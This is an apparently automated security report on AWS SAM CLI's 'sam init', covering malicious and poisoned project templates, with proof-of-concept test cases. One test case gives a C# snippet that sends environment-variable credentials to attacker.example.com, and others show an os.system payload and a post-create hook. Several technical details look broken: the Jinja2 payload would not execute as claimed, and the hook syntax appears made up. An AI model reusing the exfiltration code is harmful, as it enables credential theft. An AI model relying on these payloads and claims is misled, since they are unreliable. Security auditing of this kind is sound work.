## Combined Vulnerability List

### Vulnerability 1: Local Code Execution via Malicious Template

* **Vulnerability Name:** Local Code Execution via Malicious Template
* **Description:**
    1. A malicious actor crafts a malicious AWS SAM application template. This template can be distributed in various forms, such as a cookiecutter template or a standard SAM template archive.
    2. The malicious template contains embedded code designed to execute arbitrary commands on a user's system. This code can be placed within Jinja2 templating directives, post-generation hooks, setup scripts, or directly within template files processed by templating engines. Examples include shell scripts, Python code, or any other executable code.
    3. The attacker hosts this malicious template in a publicly accessible location, such as a GitHub repository, an S3 bucket, or a compromised template repository.
    4. A developer, intending to create a new AWS SAM project, is lured into using the `sam init --location <attacker_template_url>` command, pointing to the attacker's malicious template URL. This could be achieved through social engineering, misleading documentation, or by compromising online template registries. Alternatively, in a template poisoning scenario, the attacker compromises the official AWS SAM CLI Application Templates repository.
    5. SAM CLI fetches and processes the template. During template processing, the embedded malicious code is executed on the developer's local machine. This execution can occur during the template rendering phase, project initialization scripts, or post-generation actions, without the user's explicit consent or knowledge.
* **Impact:**
    Critical. Successful exploitation allows for arbitrary code execution on the developer's machine. This can lead to severe consequences, including:
        - **Data Theft:** Sensitive information, such as AWS credentials, API keys, source code, personal data, or environment variables, can be stolen from the developer's machine.
        - **Malware Installation:** The attacker can install malware, backdoors, ransomware, or other malicious software on the developer's system.
        - **System Compromise:** Complete compromise of the developer's machine, potentially allowing the attacker to pivot to other systems or networks accessible from the compromised machine, leading to supply chain attacks.
        - **Credential Theft:** Malicious code can steal AWS credentials or other sensitive information from the user's development environment (e.g., environment variables, AWS configuration files).
        - **Remote Code Execution:** Attackers can gain arbitrary code execution within the developer's local machine, potentially leading to further system compromise, data breaches, or supply chain attacks.
        - **Backdoor Installation:** Malicious code can establish backdoors for persistent access to the developer's environment or deployed applications.
        - **Data Exfiltration:** Sensitive project files or environment information could be exfiltrated to attacker-controlled servers.
* **Vulnerability Rank:** Critical
* **Currently Implemented Mitigations:**
    None in the project files. The project relies on users to use templates from trusted sources and does not implement any input validation or sandboxing for template processing.
* **Missing Mitigations:**
    - **Input Validation and Sanitization:** SAM CLI should thoroughly validate and sanitize template content before processing. This includes scanning templates for suspicious code patterns, disallowing or escaping potentially dangerous Jinja2 features, and neutralizing any embedded code or scripts.
    - **Sandboxing/Isolation:** The template rendering and project initialization processes should be sandboxed or isolated to limit the potential damage from malicious code execution. This could involve running template processing in restricted environments like secure containers or virtual machines with limited system access.
    - **Template Code Review and Security Audits:** Templates within the official repository should undergo rigorous code review and security audits to identify and eliminate any potential malicious code or vulnerabilities. Automated security scans on templates fetched from external URLs should also be considered.
    - **Developer Warnings and Documentation:** Implement clear warnings and documentation within SAM CLI and the application template repository, educating developers about the risks of using templates from untrusted sources. Emphasize the importance of verifying template integrity and advise users to only use templates from trusted and verified sources. Provide clear warnings when using the `--location` flag.
    - **Content Security Policy (CSP) for Templates:** Explore the feasibility of implementing a Content Security Policy for application templates to restrict the types of code and resources that templates can include and execute, especially if templates involve dynamic content rendering.
    - **Code Signing and Verification:** Implement a mechanism to digitally sign official templates and verify their integrity before `sam init` uses them. SAM CLI should verify the signature before using a template to ensure authenticity and prevent tampering.
    - **Dependency Checks:** Implement checks for dependencies fetched by templates (e.g., npm, pip, maven dependencies) to identify and block known malicious packages during template initialization.
* **Preconditions:**
    - The developer must have AWS SAM CLI installed and configured on their local machine.
    - The developer must execute the `sam init` command.
    - The `sam init` command must use the `--location` parameter to specify a template source, or the user selects a poisoned template from the official repository.
    - The specified template source or the official template repository must be malicious or compromised.
* **Source Code Analysis:**
    The provided project files consist mainly of test code, example lambda function code, and configuration files for application templates. They do not include the source code for the SAM CLI or the `sam init` command. Therefore, direct source code analysis of the vulnerability within these files is not possible.

    The vulnerability originates from the design of `sam init` to process templates, combined with the inherent capabilities of templating engines like `cookiecutter` and Jinja2 to execute code embedded within templates. The `sam init` command, as documented, leverages `cookiecutter` to generate projects from templates.  Tools like `cookiecutter` and Jinja2 are designed to interpret and execute code within templates, which becomes a security risk when processing untrusted templates.

    **Conceptual Code Flow (within SAM CLI - hypothetical):**
    ```python
    def init_project_from_template(template_source, project_name):
        template_content = fetch_template(template_source) # Fetches template from URL or local source
        # <--- Missing Vulnerability: Lack of security checks and sanitization on template_content --->
        process_template(template_content, project_name) # Processes and renders template, potentially executing embedded code
        # ... rest of initialization process
    ```

    The core vulnerability lies in the `process_template` function (or its equivalent) where malicious code embedded within the template can be executed without proper security measures like input validation or sandboxing. This execution context is the developer's local machine, granting the malicious template code full access to the user's environment.

    **Example of Malicious Code in Template (Jinja2):**
    ```
    {{ '{{' }} import os; os.system('malicious_command') {{ '}}' }}
    ```
    When `sam init` processes a template containing such code, `cookiecutter` will execute the `os.system('malicious_command')` on the developer's machine during template rendering.

* **Security Test Case:**

    **Test Case 1: Malicious Cookiecutter Template via `--location`**
    1. **Attacker Setup:**
        - **Create a malicious cookiecutter template repository:**
            - Create a new GitHub repository (e.g., `malicious-sam-template`).
            - Create a `cookiecutter.json` file with basic template information.
            - Create a template file (e.g., `hello_world/app.py`) containing malicious code within Jinja2 delimiters:
            ```python
            # hello_world/app.py (malicious template file)
            import os
            import json

            def lambda_handler(event, context):
                {{ '{{' }} import os; os.system('touch /tmp/pwned_template_injection') {{ '}}' }}
                return {
                    "statusCode": 200,
                    "body": json.dumps({
                        "message": "Hello from SAM!",
                    }),
                }
            ```
            - Commit and push these files to the `malicious-sam-template` repository.
    2. **Victim Action:**
        - **Prepare a test machine:** Set up a clean test machine with AWS SAM CLI installed.
        - **Execute `sam init` with the malicious template:** Run the following command in the test machine's terminal, replacing `<YOUR_GITHUB_USERNAME>` with your GitHub username where you hosted the malicious template:
        ```bash
        sam init --no-input --location https://github.com/<YOUR_GITHUB_USERNAME>/malicious-sam-template --name test-project-malicious
        ```
    3. **Verification:**
        - **Verify malicious code execution:** After the `sam init` command completes, check if the file `/tmp/pwned_template_injection` exists on the test machine.
        ```bash
        ls /tmp/pwned_template_injection
        ```
        - If the file `pwned_template_injection` exists in the `/tmp` directory, it indicates that the malicious code within the cookiecutter template was successfully executed during `sam init`, confirming the vulnerability.

    **Test Case 2: Malicious SAM Template Archive via `--location`**
    1. **Attacker Setup:**
        - **Create a malicious AWS SAM template (e.g., `malicious-template.zip`) for dotnet8 runtime.**
        - **Embed malicious code within the template.** For example, in `template.yaml`, add a `Metadata` section with a post-create hook that executes a reverse shell script or simply creates a file in the user's home directory.
        - **Example `template.yaml` snippet with malicious post-create hook:**
        ```yaml
        Transform: AWS::Serverless-2016-10-31
        Description: An example SAM application

        Metadata:
          SamCliHook:
            post_create: "echo 'Malicious code executed' > /tmp/pwned_post_create_hook"

        Resources:
          HelloWorldFunction:
            Type: AWS::Serverless::Function
            Properties:
              Handler: HelloWorld::HelloWorld.Function::FunctionHandler
              Runtime: dotnet8
              CodeUri: s3://sam-cli-app-templates/patterns/hello-dotnet.zip
              MemorySize: 512
              Timeout: 30
        ```
        - **Host `malicious-template.zip` on a public GitHub repository or S3 bucket (e.g., `https://<attacker-controlled-domain>/malicious-template.zip`).**
    2. **Victim Action:**
        - **On a local machine with AWS SAM CLI installed, execute the command:**
        ```bash
        sam init --no-input --location https://<attacker-controlled-domain>/malicious-template.zip --name test-project
        ```
    3. **Verification:**
        - **Observe the victim's machine for signs of code execution.**
        - **Check if the file `/tmp/pwned_post_create_hook` is created.**
        ```bash
        ls /tmp/pwned_post_create_hook
        ```
        - If the file exists, the post-create hook, and thus malicious code, was executed.

### Vulnerability 2: Template Poisoning via Compromised Official Repository

* **Vulnerability Name:** Template Poisoning
* **Description:**
    1. An attacker gains write access to the official AWS SAM CLI Application Templates repository (e.g., through compromised credentials, exploiting a repository vulnerability, or insider threat).
    2. The attacker modifies template files within the repository. This involves injecting malicious code into template files (YAML/JSON, code files, scripts) or adding malicious scripts (e.g., post-generation hooks) to existing templates.
    3. The attacker commits and pushes these malicious changes to the repository, making the poisoned templates available to users.
    4. A developer, unaware of the compromise, uses `sam init` to create a new project. The developer might implicitly use a poisoned template by selecting a default template or explicitly choosing a template that has been compromised within the official repository.
    5. The `sam init` command fetches the template list and template files from the (now compromised) official repository.
    6. During project initialization, the malicious code embedded in the poisoned template is executed in the user's development environment. This execution can occur during template rendering, project build scripts, or post-generation actions initiated by `sam init` or subsequent build processes.
* **Impact:**
    Critical. Successful template poisoning can have widespread and severe consequences for users relying on official templates:
        - **Supply Chain Attack:** Compromises the trust in official AWS tooling and templates, affecting a broad range of developers.
        - **Credential Theft:** Malicious code can steal AWS credentials or other sensitive information from the user's development environment as described in Vulnerability 1.
        - **Remote Code Execution:** Attackers gain arbitrary code execution on developer machines, leading to system compromise, data breaches, or further supply chain propagation.
        - **Backdoor Installation:** Malicious templates can install persistent backdoors for long-term access to developer environments or deployed applications.
        - **Data Exfiltration:** Sensitive project data and environment information can be exfiltrated to attacker-controlled servers.
* **Vulnerability Rank:** Critical
* **Currently Implemented Mitigations:**
    Currently, there are no specific code-level mitigations implemented within the project itself to prevent template poisoning. Mitigation relies on general GitHub security features and AWS security practices to prevent unauthorized modifications to the repository.
* **Missing Mitigations:**
    - **Code Signing and Verification:** Implement a robust mechanism to digitally sign templates upon release and have SAM CLI strictly verify these signatures before using any template from the official repository. This ensures template integrity and authenticity.
    - **Content Security Policy (CSP) for Templates:** If templates use dynamic content rendering, enforce a strict Content Security Policy to limit the capabilities of rendered content and mitigate potential cross-site scripting (XSS) style attacks within templates.
    - **Sandboxing or Isolation:**  Sandbox the template initialization process, especially when using official templates, to contain potential damage from any undetected malicious code. Run template rendering and initial build steps in isolated containers or virtual machines.
    - **Dependency Checks:** Implement automated checks for dependencies fetched by official templates (e.g., npm, pip, maven dependencies) to proactively identify and block known malicious packages before they are integrated into user projects.
    - **Regular Security Audits:** Conduct frequent, in-depth security audits of all official templates to proactively identify and remove any injected malicious code or latent vulnerabilities that might be present.
    - **User Education and Awareness:** Provide clear and prominent warnings to users about the inherent risks of using code templates, even from official sources. Educate users on best practices for verifying template contents and monitoring for suspicious activity after project initialization.
    - **Repository Access Control and Monitoring:** Enforce strict access control policies for the official template repository, utilizing multi-factor authentication and the principle of least privilege. Implement comprehensive monitoring and logging of repository activities to detect and respond to unauthorized modifications promptly.
* **Preconditions:**
    - Attacker successfully gains write access to the official AWS SAM CLI Application Templates repository or achieves a Man-in-the-Middle (MITM) position to inject modified template manifests or templates during download.
    - User executes `sam init` command and uses a compromised template, either directly by selecting a poisoned template or indirectly by using a default template that has been poisoned.
    - User's development environment is susceptible to the injected malicious code (e.g., lacks robust security controls, uses vulnerable dependencies, runs with elevated privileges).
* **Source Code Analysis:**
    The provided files are primarily documentation and example templates, and they do not contain code that directly introduces new vulnerabilities beyond the inherent risk of template poisoning. The vulnerability exists in the potential compromise of the template repository itself, which is external to the application code files provided. The risk is amplified by the fact that templates can include code in various programming languages and configuration files, allowing for diverse attack vectors within initialized projects.

    The vulnerability is not within the application code of the templates themselves, but in the infrastructure and processes surrounding the distribution and usage of these templates within the SAM CLI ecosystem. The lack of template signing and verification within SAM CLI, combined with the potential for repository compromise, creates a critical security gap.

* **Security Test Case:**
    1. **Attacker Setup (Simulated Repository Compromise):**
        - **Fork the `aws-sam-cli-app-templates` repository to your own GitHub account.** This simulates gaining control over a template source.
        - **Clone your forked repository locally.**
    2. **Template Poisoning:**
        - **Navigate to a template directory (e.g., `dotnet8/hello`).**
        - **Modify a template file to include malicious code.** For example, modify `dotnet8/hello/{{cookiecutter.project_name}}/src/HelloWorld/Function.cs` to include code that attempts to exfiltrate environment variables to a simulated attacker server.
        ```csharp
        // Injected malicious code example (for demonstration only, not functional C# exfiltration code):
        string username = Environment.GetEnvironmentVariable("USERNAME");
        string password = Environment.GetEnvironmentVariable("PASSWORD");
        try {
            System.Net.WebClient client = new System.Net.WebClient();
            client.DownloadString("http://attacker.example.com/log?user=" + username + "&pass=" + password);
        } catch (System.Net.WebException) {
            // Ignore network errors for test purposes
        }
        ```
    3. **Simulate User Action:**
        - **Modify your local SAM CLI configuration to point to your forked repository for template retrieval.** This is done to test the poisoned template without actually compromising the official repository.  As described in the `/code/README.md` file, this might involve updating `samcli/commands/init/init_templates.py` in your local SAM CLI installation to point to your fork and commit hash. **Note:** Modifying local SAM CLI installation requires caution and should be done in a controlled testing environment.
        - **Run `sam init --no-input --runtime dotnet8 --app-template hello --name malicious-app` in a test environment.** This command now uses the poisoned template from your forked repository.
    4. **Verification:**
        - **Monitor network traffic and system logs during and after `sam init` for any signs of malicious activity.** Look for unexpected network connections to the simulated attacker server (e.g., using network monitoring tools).
        - **Examine the created project directory for any artifacts of malicious activity.** In a real-world scenario, more sophisticated malicious code could be injected.

**Important Note:** These security test cases must be executed in a controlled, isolated test environment to prevent accidental compromise of sensitive data or systems. Simulating repository compromise should be done ethically and only on repositories under your control.
